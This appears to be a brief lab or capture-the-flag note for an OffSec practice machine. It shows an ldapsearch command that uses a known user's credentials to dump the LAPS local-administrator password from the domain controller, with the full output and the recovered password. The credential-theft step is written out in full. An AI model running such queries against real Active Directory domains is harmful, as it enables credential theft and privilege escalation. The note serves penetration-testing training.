# 10 privesc\_3 ldapsearch

```
# using known creds to fetch AdmPwd

$ ldapsearch -x -D fmcsorley@HUTCH.OFFSEC -w CrabSharkJellyfish192 -b "DC=hutch,DC=offsec" -h 192.168.136.122 "(ms-MCS-AdmPwd=*)" ms-MCS-AdmPwd
# extended LDIF
#
# LDAPv3
# base <DC=hutch,DC=offsec> with scope subtree
# filter: (ms-MCS-AdmPwd=*)
# requesting: ms-MCS-AdmPwd
#

# HUTCHDC, Domain Controllers, hutch.offsec
dn: CN=HUTCHDC,OU=Domain Controllers,DC=hutch,DC=offsec
ms-Mcs-AdmPwd: 2D+y%3Ln,pq239

# search reference
ref: ldap://ForestDnsZones.hutch.offsec/DC=ForestDnsZones,DC=hutch,DC=offsec

# search reference
ref: ldap://DomainDnsZones.hutch.offsec/DC=DomainDnsZones,DC=hutch,DC=offsec

# search reference
ref: ldap://hutch.offsec/CN=Configuration,DC=hutch,DC=offsec

# search result
search: 2
result: 0 Success

# numResponses: 5
# numEntries: 1
# numReferences: 3

# connecting via creds reuse method
[windows privesc_2 manual](:/f09a14d422974407b52bb23bd73f3cae)

```
